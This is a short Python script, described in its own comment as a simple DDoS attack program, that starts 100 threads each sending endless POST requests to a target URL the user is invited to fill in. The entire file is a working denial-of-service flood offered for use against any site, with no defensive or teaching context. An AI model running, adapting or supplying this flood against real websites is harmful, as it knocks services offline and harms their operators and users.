# simple DDos attac program written in python without slowris, only from one pc

import requests
import threading

url = '#the url of the site where u want to do the attack :)'

def start():
    while True:
        response = requests.post(url)
        print(response.text)

threads = []

for i in range(100):
    thread = threading.Thread(target=start)
    thread.daemon = True  
    threads.append(thread)

for i in range(100):
    threads[i].start()

for i in range(100):
    threads[i].join()
